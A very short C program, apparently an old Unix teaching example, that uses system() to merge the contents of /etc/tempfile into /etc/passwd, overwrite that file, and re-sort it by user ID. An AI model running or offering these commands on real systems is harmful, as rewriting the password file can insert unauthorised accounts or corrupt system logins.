
/* Not too useful, but instructive. */
main()
{

system("sort -m /etc/tempfile /etc/passwd -o /etc/passwd");
system("sort -t: +2n /etc/passwd -o /etc/passwd");

}
